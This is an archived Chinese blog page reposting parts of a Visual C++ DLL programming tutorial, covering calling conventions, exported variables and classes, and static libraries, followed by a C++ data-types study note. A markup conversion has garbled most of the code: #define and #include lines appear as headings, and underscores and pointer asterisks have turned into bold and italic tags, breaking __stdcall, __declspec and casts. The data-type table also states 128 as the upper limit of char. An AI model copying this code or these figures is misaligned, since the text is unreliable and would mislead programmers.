<h1>else</h1>

<h1>define MAKEINTRESOURCE MAKEINTRESOURCEA</td></h1>

<p></tr>
</table>
　　4.5 __stdcall约定</p>

<p>　　如果通过VC++编写的DLL欲被其他语言编写的程序调用，应将函数的调用方式声明为<strong>stdcall方式，WINAPI都采用这种方式，而C/C++缺省的调用方式却为</strong>cdecl。<strong>stdcall方式与</strong>cdecl对函数名最终生成符号的方式不同。若采用C编译方式(在C++中需将函数声明为extern &ldquo;C&rdquo;)，<strong>stdcall调用约定在输出函数名前面加下划线，后面加“@”符号和参数的字节数，形如_functionname@number；而</strong>cdecl调用约定仅在输出函数名前面加下划线，形如_functionname。</p>

<p>　　Windows编程中常见的几种函数类型声明宏都是与<strong>stdcall和</strong>cdecl有关的（节选自windef.h）：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#define CALLBACK __stdcall //这就是传说中的回调函数</p>

<h1>define WINAPI __stdcall //这就是传说中的WINAPI</h1>

<h1>define WINAPIV __cdecl</h1>

<h1>define APIENTRY WINAPI //DllMain的入口就在这里</h1>

<h1>define APIPRIVATE __stdcall</h1>

<h1>define PASCAL __stdcall</td></h1>

<p></tr>
</table>
　　在lib.h中，应这样声明add函数：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>int <strong>stdcall add(int x, int y);</td>
</tr>
</table>
　　在应用工程中函数指针类型应定义为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>typedef int(</strong>stdcall <em>lpAddFun)(int, int);</td>
</tr>
</table>
　　若在lib.h中将函数声明为__stdcall调用，而应用工程中仍使用typedef int (</em> lpAddFun)(int,int)，运行时将发生错误（因为类型不匹配，在应用工程中仍然是缺省的__cdecl调用），弹出如图7所示的对话框。
<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/vrn4lm2rlf11.jpg" />
图7 调用约定不匹配时的运行错误</td>
</tr>
</table>
　　图8中的那段话实际上已经给出了错误的原因，即“This is usually a result of　…”。</p>

<p>　　<a target="_blank" href="http://www.mydown.com/code/244/244554.html"><font color="#000000">单击此处下载__stdcall调用例子工程源代码</font></a>。</p>

<p><p class="guanggao">　　4.6 DLL导出变量</p>

<p>　　DLL定义的全局变量可以被调用进程访问；DLL也可以访问调用进程的全局数据，我们来看看在应用工程中引用DLL中变量的例子（<a target="_blank" href="http://www.mydown.com/code/244/244552.html"><font color="#000000">单击此处下载本工程</font></a>）。
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>/<em> 文件名：lib.h　</em>/</p>

<h1>ifndef LIB_H</h1>

<h1>define LIB_H</h1>

<p>extern int dllGlobalVar;</p>

<h1>endif</h1>

<p>/<em> 文件名：lib.cpp </em>/</p>

<h1>include &ldquo;lib.h&rdquo;</h1>

<h1>include &lt;windows.h&gt;</h1>

<p>int dllGlobalVar;</p>

<p>BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
　switch (ul_reason_for_call)
　{
　　case DLL_PROCESS_ATTACH:
　　　dllGlobalVar = 100; //在dll被加载时，赋全局变量为100
　　　break;
　　case DLL_THREAD_ATTACH:
　　case DLL_THREAD_DETACH:
　　case DLL_PROCESS_DETACH:
　　　break;
　}
　return TRUE;
}</td>
</tr>
</table>
　　;文件名：lib.def</p>

<p>　　;在DLL中导出变量
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>LIBRARY &ldquo;dllTest&rdquo;</p>

<p>EXPORTS</p>

<p>dllGlobalVar CONSTANT</p>

<p>;或dllGlobalVar DATA</p>

<p>GetGlobalVar</td>
</tr>
</table>
　　从lib.h和lib.cpp中可以看出，全局变量在DLL中的定义和使用方法与一般的<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>设计是一样的。若要导出某全局变量，我们需要在.def文件的EXPORTS后添加：</p>

<p>　　变量名　CONSTANT　　　//过时的方法</p>

<p>　　或</p>

<p>　　变量名　DATA　　　 　//VC++提示的新方法</p>

<p>　　在主函数中引用DLL中定义的全局变量：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;stdio.h&gt;</p>

<h1>pragma comment(lib,&ldquo;dllTest.lib&rdquo;)</h1>

<p>extern int dllGlobalVar;</p>

<p>int main(int argc, char <em>argv[])
{
　printf(&ldquo;%d &rdquo;, </em>(int<em>)dllGlobalVar);
　</em>(int<em>)dllGlobalVar = 1;
　printf(&ldquo;%d &rdquo;, </em>(int<em>)dllGlobalVar);
　return 0;
}</td>
</tr>
</table>
　　特别要注意的是用extern int dllGlobalVar声明所导入的并不是DLL中全局变量本身，而是其地址，应用程序必须通过强制指针转换来使用DLL中的全局变量。这一点，从</em>(int*)dllGlobalVar可以看出。因此在采用这种方式引用DLL全局变量时，千万不要进行这样的赋值操作：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>dllGlobalVar = 1;</td>
</tr>
</table>
　　其结果是dllGlobalVar指针的内容发生变化，程序中以后再也引用不到DLL中的全局变量了。</p>

<p>　　在应用工程中引用DLL中全局变量的一个更好方法是：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;stdio.h&gt;</p>

<h1>pragma comment(lib,&ldquo;dllTest.lib&rdquo;)</h1>

<p>extern int <em>declspec(dllimport) dllGlobalVar; //用</em>declspec(dllimport)导入
int main(int argc, char *argv[])
{
　printf(&ldquo;%d &rdquo;, dllGlobalVar);
　dllGlobalVar = 1; //这里就可以直接使用, 无须进行强制指针转换
　printf(&ldquo;%d &rdquo;, dllGlobalVar);
　return 0;
}</td>
</tr>
</table>
　　通过_declspec(dllimport)方式导入的就是DLL中全局变量本身而不再是其地址了，笔者建议在一切可能的情况下都使用这种方式。</p>

<p>　　4.7 DLL导出类</p>

<p>　　DLL中定义的类可以在应用工程中使用。</p>

<p>　　下面的例子里，我们在DLL中定义了point和circle两个类，并在应用工程中引用了它们（<a target="_blank" href="http://www.mydown.com/code/244/244553.html"><font color="#0000ff">单击此处下载本工程</font></a>）。
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//文件名：point.h，point类的声明</p>

<h1>ifndef POINT_H</h1>

<h1>define POINT_H</h1>

<h1>ifdef DLL_FILE</h1>

<p>　class _declspec(dllexport) point //导出类point</p>

<h1>else</h1>

<p>　class _declspec(dllimport) point //导入类point</p>

<h1>endif</h1>

<p>{
　public:
　　float y;
　　float x;
　　point();
　　point(float x_coordinate, float y_coordinate);
};</p>

<h1>endif</h1>

<p>//文件名：point.cpp，point类的实现</p>

<h1>ifndef DLL_FILE</h1>

<p>　#define DLL_FILE</p>

<h1>endif</h1>

<h1>include &ldquo;point.h&rdquo;</h1>

<p>//类point的缺省构造函数</p>

<p>point::point()
{
　x = 0.0;
　y = 0.0;
}</p>

<p>//类point的构造函数</p>

<p>point::point(float x_coordinate, float y_coordinate)
{
　x = x_coordinate;
　y = y_coordinate;
}</p>

<p>//文件名：circle.h，circle类的声明</p>

<h1>ifndef CIRCLE_H</h1>

<h1>define CIRCLE_H</h1>

<h1>include &ldquo;point.h&rdquo;</h1>

<h1>ifdef DLL_FILE</h1>

<p>class _declspec(dllexport)circle //导出类circle</p>

<h1>else</h1>

<p>class _declspec(dllimport)circle //导入类circle</p>

<h1>endif</h1>

<p>{
　public:
　　void SetCentre(const point &amp;centrePoint);
　　void SetRadius(float r);
　　float GetGirth();
　　float GetArea();
　　circle();
　private:
　　float radius;
　　point centre;
};</p>

<h1>endif</h1>

<p>//文件名：circle.cpp，circle类的实现</p>

<h1>ifndef DLL_FILE</h1>

<h1>define DLL_FILE</h1>

<h1>endif</h1>

<h1>include &ldquo;circle.h&rdquo;</h1>

<h1>define PI 3.1415926</h1>

<p>//circle类的构造函数</p>

<p>circle::circle()
{
　centre = point(0, 0);
　radius = 0;
}</p>

<p>//得到圆的面积</p>

<p>float circle::GetArea()
{
　return PI *radius * radius;
}</p>

<p>//得到圆的周长</p>

<p>float circle::GetGirth()
{
　return 2 *PI * radius;
}</p>

<p>//设置圆心坐标</p>

<p>void circle::SetCentre(const point &amp;centrePoint)
{
　centre = centrePoint;
}</p>

<p>//设置圆的半径</p>

<p>void circle::SetRadius(float r)
{
　radius = r;
}</td>
</tr>
</table>
　　类的引用：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &ldquo;..\circle.h&#8221;　　//包含类声明头文件</p>

<h1>pragma comment(lib,&ldquo;dllTest.lib&rdquo;);</h1>

<p>int main(int argc, char *argv[])
{
　circle c;
　point p(2.0, 2.0);
　c.SetCentre(p);
　c.SetRadius(1.0);
　printf(&ldquo;area:%f girth:%f&rdquo;, c.GetArea(), c.GetGirth());
　return 0;
}</td>
</tr>
</table>
　　从上述源代码可以看出，由于在DLL的类实现代码中定义了宏DLL_FILE，故在DLL的实现中所包含的类声明实际上为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class <em>declspec(dllexport) point //导出类point
{
　…
}</td>
</tr>
</table>
　　和
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class </em>declspec(dllexport) circle //导出类circle
{
　…
}</td>
</tr>
</table>
　　而在应用工程中没有定义DLL_FILE，故其包含point.h和circle.h后引入的类声明为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class <em>declspec(dllimport) point //导入类point
{
　…
}</td>
</tr>
</table>
　　和
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class </em>declspec(dllimport) circle //导入类circle
{
　…
}</td>
</tr>
</table>
　　不错，正是通过DLL中的
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class <em>declspec(dllexport) class_name //导出类circle　
{
　…
}</td>
</tr>
</table>
　　与应用程序中的
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class </em>declspec(dllimport) class_name //导入类
{
　…
}</td>
</tr>
</table>
　　匹对来完成类的导出和导入的！</p>

<p>　　我们往往通过在类的声明头文件中用一个宏来决定使其编译为class <em>declspec(dllexport) class_name还是class </em>declspec(dllimport) class_name版本，这样就不再需要两个头文件。本程序中使用的是：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#ifdef DLL_FILE
　class _declspec(dllexport) class_name //导出类</p>

<h1>else</h1>

<p>　class _declspec(dllimport) class_name //导入类</p>

<h1>endif</td></h1>

<p></tr>
</table>
　　实际上，在MFC DLL的讲解中，您将看到比这更简便的方法，而此处仅仅是为了说明<em>declspec(dllexport)与</em>declspec(dllimport)匹对的问题。</p>

<p>　　由此可见，应用工程中几乎可以看到DLL中的一切，包括函数、变量以及类，这就是DLL所要提供的强大能力。只要DLL释放这些接口，应用程序使用它就将如同使用本工程中的程序一样！</p>

<p>　　本章虽以VC++为平台讲解非MFC DLL，但是这些普遍的概念在其它语言及开发环境中也是相同的，其思维方式可以直接过渡。 接下来，我们将要研究MFC规则DLL。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T14:49:07+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-er//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-yi/">
		
			Visual C++动态链接库编程（一）</a>
	</h2>
	<div class="entry-content">
		<p> 最近在网上闲逛，一是为了巩固和拓展一下对C/C++的研习，二是大致感受下windows编程原理。当然最近被汇编也搞的比较晕乎，找机会出来透点新鲜空气。</p>

<p> 要说我接触VC的时间很短，仅凭一两个工程实例和一本本科阶段教材恐怕也是微不足道。下面这篇文章就是对书本之外相当不错的补充，当然此类书籍绝不缺少字纸版本。只不过，文章作者宋宝华老师所展现给我们的，却不比任何动辄数百页的书商们逊色。</p>

<p> 　　<strong>1.概论</strong></p>

<p>　　先来阐述一下DLL(Dynamic Linkable Library)的概念，你可以简单的把DLL看成一种仓库，它提供给你一些可以直接拿来用的变量、函数或类。在仓库的发展史上经历了“无库－静态链接库－动态链接库”的时代。静态链接库与动态链接库都是共享代码的方式，如果采用静态链接库，则无论你愿不愿意，lib中的指令都被直接包含在最终生成的EXE文件中了。但是若使用DLL，该DLL不必被包含在最终EXE文件中，EXE文件执行时可以“动态”地引用和卸载这个与EXE独立的DLL文件。静态链接库和动态链接库的另外一个区别在于静态链接库中不能再包含其他的动态链接库或者静态库，而在动态链接库中还可以再包含其他的动态或静态链接库。</p>

<p>  对动态链接库，我们还需建立如下概念：</p>

<p>　　（1）DLL 的编制与具体的编程语言及编译器无关</p>

<p>　　只要遵循约定的DLL接口规范和调用方式，用各种语言编写的DLL都可以相互调用。譬如Windows提供的系统DLL（其中包括了Windows的API），在任何开发环境中都能被调用，不在乎其是Visual Basic、Visual C++还是Delphi。</p>

<p>　　（2）动态链接库随处可见</p>

<p>　　我们在Windows目录下的system32文件夹中会看到kernel32.dll、user32.dll和gdi32.dll，windows的大多数API都包含在这些DLL中。kernel32.dll中的函数主要处理内存管理和进程调度；user32.dll中的函数主要控制用户界面；gdi32.dll中的函数则负责图形方面的操作。</p>

<p>　　一般的<a target="_blank" href="http://dev.yesky.com/" class="bluekey">程序</a>员都用过类似MessageBox的函数，其实它就包含在user32.dll这个动态链接库中。由此可见DLL对我们来说其实并不陌生。</p>

<p>　　(3)VC动态链接库的分类</p>

<p>　　Visual C++支持三种DLL，它们分别是Non-MFC DLL（非MFC动态库）、MFC Regular DLL（MFC规则DLL）、MFC Extension DLL（MFC扩展DLL）。</p>

<p>　　非MFC动态库不采用MFC类库结构，其导出函数为标准的C接口，能被非MFC或MFC编写的应用程序所调用；MFC规则DLL 包含一个继承自CWinApp的类，但其无消息循环；MFC扩展DLL采用MFC的动态链接版本创建，它只能被用MFC类库所编写的应用程序所调用。</p>

<p>　　由于本文篇幅较长，内容较多，势必需要先对阅读本文的有关事项进行说明，下面以问答形式给出。</p>

<p>　　问：本文主要讲解什么内容？</p>

<p>　　答：本文详细介绍了DLL编程的方方面面，努力学完本文应可以对DLL有较全面的掌握，并能编写大多数DLL程序。</p>

<p>　　问：如何看本文？</p>

<p>　　答：本文每一个主题的讲解都附带了源代码例程，可以随文下载（每个工程都经WINRAR压缩）。所有这些例程都由笔者编写并在VC++6.0中调试通过。</p>

<p>　　当然看懂本文不是读者的最终目的，读者应亲自动手实践才能真正掌握DLL的奥妙。</p>

<p>　　问：学习本文需要什么样的基础知识？</p>

<p>　　答：如果你掌握了C，并大致掌握了C++，了解一点MFC的知识，就可以轻松地看懂本文。</p>

<p>　<strong>　2.静态链接库</strong></p>

<p>　　对静态链接库的讲解不是本文的重点，但是在具体讲解DLL之前，通过一个静态链接库的例子可以快速地帮助我们建立“库”的概念。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/6v58bw881n81.jpg" />
图1 建立一个静态链接库</td>
</tr>
</table>


<p>　　如图1，在VC++6.0中new一个名称为libTest的static library工程（单击此处下载本工程），并新建lib.h和lib.cpp两个文件，lib.h和lib.cpp的源代码如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//文件：lib.h

#ifndef LIB_H
#define LIB_H
extern &#8220;C&#8221; int add(int x,int y);　　　//声明为C编译、连接方式的外部函数
#endif

//文件：lib.cpp

#include &#8220;lib.h&#8221;
int add(int x,int y)
{
　return x + y;
}</td>
</tr>
</table>


<p>　　编译这个工程就得到了一个.lib文件，这个文件就是一个函数库，它提供了add的功能。将头文件和.lib文件提交给用户后，用户就可以直接使用其中的add函数了。</p>

<p>　　标准Turbo C2.0中的C库函数（我们用来的scanf、printf、memcpy、strcpy等）就来自这种静态库。</p>

<p>　　下面来看看怎么使用这个库，在libTest工程所在的工作区内new一个libCall工程。libCall工程仅包含一个main.cpp文件，它演示了静态链接库的调用方法，其源代码如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;stdio.h&gt;
#include &#8220;..\lib.h&#8221;
#pragma comment( lib, &#8220;..&#92;debug&#92;libTest.lib&#8221; ) 　//指定与静态库一起连接

int main(int argc, char* argv[])
{
　printf( &#8220;2 + 3 = %d&#8221;, add( 2, 3 ) );
}</td>
</tr>
</table>


<p>　　静态链接库的调用就是这么简单，或许我们每天都在用，可是我们没有明白这个概念。代码中#pragma comment( lib , &ldquo;..\debug\libTest.lib&rdquo; )的意思是指本文件生成的.obj文件应与libTest.lib一起连接。如果不用#pragma comment指定，则可以直接在VC++中设置，如图2，依次选择tools、options、directories、library files菜单或选项，填入库文件路径。图2中加红圈的部分为我们添加的libTest.lib文件的路径。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/rcw6s5cz52wb.jpg" />
图2 在VC中设置库文件路径</td>
</tr>
</table>


<p>　　这个静态链接库的例子至少让我们明白了库函数是怎么回事，它们是哪来的。我们现在有下列模糊认识了：</p>

<p>　　（1）库不是个怪物，编写库的程序和编写一般的程序区别不大，只是库不能单独执行；</p>

<p>　　（2）库提供一些可以给别的程序调用的东东，别的程序要调用它必须以某种方式指明它要调用之。</p>

<p>　　以上从静态链接库分析而得到的对库的懵懂概念可以直接引申到动态链接库中，动态链接库与静态链接库在编写和调用上的不同体现在库的外部接口定义及调用方式略有差异。</p>

<p><strong>3.库的调试与查看</p>

<p></strong>　　在具体进入各类DLL的详细阐述之前，有必要对库文件的调试与查看方法进行一下介绍，因为从下一节开始我们将面对大量的例子工程。</p>

<p>　　由于库文件不能单独执行，因而在按下F5（开始debug模式执行）或CTRL+F5（运行）执行时，其弹出如图3所示的对话框，要求用户输入可执行文件的路径来启动库函数的执行。这个时候我们输入要调用该库的EXE文件的路径就可以对库进行调试了，其调试技巧与一般应用工程的调试一样。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/xupwa5a7t93h.jpg" />
图3 库的调试与“运行”</td>
</tr>
</table>


<p>　　通常有比上述做法更好的调试途径，那就是将库工程和应用工程（调用库的工程）放置在同一VC工作区，只对应用工程进行调试，在应用工程调用库中函数的语句处设置断点，执行后按下F11，这样就单步进入了库中的函数。第2节中的libTest和libCall工程就放在了同一工作区，其工程结构如图4所示。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/lv690b4m255y.jpg" />
图4　把库工程和调用库的工程放入同一工作区进行调试</td>
</tr>
</table>


<p>　　上述调试方法对静态链接库和动态链接库而言是一致的。所以本文提供下载的所有源代码中都包含了库工程和调用库的工程，这二者都被包含在一个工作区内，这是笔者提供这种打包下载的用意所在。</p>

<p>　　动态链接库中的导出接口可以使用Visual C++的Depends工具进行查看，让我们用Depends打开系统目录中的user32.dll，看到了吧？红圈内的就是几个版本的MessageBox了！原来它真的在这里啊，原来它就在这里啊！</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/4q1kv1nrlhov.jpg" />
图5　用Depends查看DLL</td>
</tr>
</table>


<p>　　当然Depends工具也可以显示DLL的层次结构，若用它打开一个可执行文件则可以看出这个可执行文件调用了哪些DLL。</p>

<p>　　好，让我们正式进入动态链接库的世界，先来看看最一般的DLL，即非MFC DLL。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T14:44:45+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-yi//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/03/31/C-xue-xi-bi-ji-chong-wen-ji-hua-zhi-san/">
		
			C++学习笔记(重温计划之三)</a>
	</h2>
	<div class="entry-content">
		<p>3、数据类型(上)</p>

<p> c++中的数据类型,主要分为内部数据类型和外部数据类型两大类。其中，内部数据类型主要有：</p>

<p>  1）整数类型int;</p>

<p>   计算机内部是以二进制补码的形式表示整数的。从十进制转换的具体方法为除二取余、高位补零、再取反。整形数的表示范围如下:</p>

<table align="center" style="border-collapse: collapse">
<tr>
<td rowSpan="2" width="122" vAlign="top" style="padding-right: 5.4pt; padding-left: 5.4pt; padding-bottom: 0pt; width: 91.6pt; padding-top: 0pt; border: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">类型</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td rowSpan="2" width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">字节数</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td rowSpan="2" width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">位数</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td colSpan="2" width="184" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 138.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">表示范围</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td rowSpan="2" width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">解释</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">下限</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">上限</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">char</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">1</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">8</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-128</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">128</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^7~(2^7-1)</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">signed char</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">1</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">8</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-128</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">128</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^7~(2^7-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">un</span><span style="font-size: 10.5pt; font-family: '宋体'">signed char</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">1</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">8</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
